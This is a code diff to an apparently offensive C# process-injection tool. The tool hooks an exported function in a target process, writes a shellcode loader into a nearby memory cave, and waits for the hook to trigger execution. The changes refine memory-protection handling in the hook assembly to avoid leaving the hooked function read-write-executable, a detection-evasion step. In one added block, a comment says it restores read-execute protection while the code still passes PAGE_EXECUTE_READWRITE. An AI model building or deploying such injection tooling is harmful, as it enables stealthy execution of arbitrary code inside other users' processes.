@@ -77,9 +77,32 @@ internal static class Program
             a:  41 51                   push   r9
             c:  41 52                   push   r10
             e:  41 53                   push   r11
+
+        // change function back to RWX to overwrite the original bytes
+        sub rsp, 30h          ; Allocate shadow space (20h) + extra space for oldProtect variable (8h)
+        mov rcx, hookedFunc   ; Arg 1: The Address of the hooked function
+        mov rdx, 8            ; Arg 2: Size (only the first 8 bytes must be overwritten)
+        mov r8, 40h           ; Arg 3: New protect (PAGE_EXECUTE_READWRITE)
+        lea r9, [rsp + 20h]   ; Arg 4: Point out variable r9 to a temporary stack
+        mov rax, VirtProt     ; addr of VirtualProtect, must be calculated and written by injector
+        call rax
+        // add rsp, 30h          ; Clean up stack
+
             10: 48 b9 88 77 66 55 44    movabs rcx,0x1122334455667788
             17: 33 22 11
             1a: 48 89 08                mov    QWORD PTR [rax],rcx
+
+        // and change again back to RX
+        // sub rsp, 30h          ; Allocate shadow space (20h) + extra space for oldProtect variable (8h)
+        mov rcx, hookedFunc   ; Arg 1: The Address of the hooked function
+        mov rdx, 8            ; Arg 2: Size (only the first 8 bytes must be overwritten)
+        mov r8, 40h           ; Arg 3: New protect (PAGE_EXECUTE_READWRITE)
+        lea r9, [rsp + 20h]   ; Arg 4: Point out variable r9 to a temporary stack
+        mov rax, VirtProt     ; addr of VirtualProtect, must be calculated and written by injector
+        call rax
+        add rsp, 30h          ; Clean up stack
+
+
             1d: 48 83 ec 40             sub    rsp,0x40
             21: e8 11 00 00 00          call   shellcode
             26: 48 83 c4 40             add    rsp,0x40
@@ -219,7 +242,7 @@ internal static class Program
         Console.WriteLine($"[=] Opened process with id {pid}");
 
         var shellcode = LoadShellcode(shellcodeStr);
-        
+
         var loaderAddress = FindMemoryHole(
             hProcess,
             (ulong)exportAddress,
@@ -233,15 +256,10 @@ internal static class Program
 
         Console.WriteLine($"[=] Allocated loader and shellcode at 0x{loaderAddress:x} within PID {pid}");
 
+        
+        // get the original bytes of the to-be-overwritten export function
         var originalBytes = Marshal.ReadInt64(exportAddress);
         GenerateHook(originalBytes);
-
-        ProtectVirtualMemory(
-            hProcess,
-            exportAddress,
-            8,
-            MemoryProtection.ExecuteReadWrite,
-            out var oldProtectHook);
 
         var relativeLoaderAddress = (int)(loaderAddress - ((ulong)exportAddress + 5));
         var callOpCode = new byte[] { 0xe8, 0, 0, 0, 0 };
@@ -250,6 +268,14 @@ internal static class Program
         using var br = new BinaryWriter(ms);
         br.Seek(1, SeekOrigin.Begin);
         br.Write(relativeLoaderAddress);
+
+        // write the call to the loader stub
+        ProtectVirtualMemory(
+            hProcess,
+            exportAddress,
+            8,
+            MemoryProtection.ExecuteReadWrite,
+            out var oldProtectHook);
 
         status = WriteVirtualMemory(
             hProcess,
@@ -262,9 +288,15 @@ internal static class Program
             Console.WriteLine($"[!] Failed to write callOpCode: {status}");
             return;
         }
-        // TODO Avoid RWX on hooked function.  Hook assembly will need to handle VirtualProtect calls.
-        // TODO change mem prot of hook back here, already
+        
+        ProtectVirtualMemory(
+            hProcess,
+            exportAddress,
+            8,
+            oldProtectHook,
+            out _);
 
+        // write the shellcode loader stub to the code cave
         var payload = ShellcodeLoader.Concat(shellcode).ToArray();
 
         status = ProtectVirtualMemory(
@@ -305,8 +337,9 @@ internal static class Program
             return;
         }
 
+        // and finally wait for execution
         var timer = new Stopwatch();
-        int timeout = 60*60; // or 60*60 for debugging, TODO return to 60
+        int timeout = 60;
         timer.Start();
         var executed = false;
 
@@ -341,13 +374,6 @@ internal static class Program
 
         if (executed)
         {
-            ProtectVirtualMemory( // TODO: Avoid RWX on hooked function. Hook assembly will need to handle VirtualProtect calls.
-                hProcess,
-                exportAddress,
-                8,
-                oldProtectHook,
-                out _);
-
             FreeVirtualMemory(
                 hProcess,
                 (IntPtr)loaderAddress);
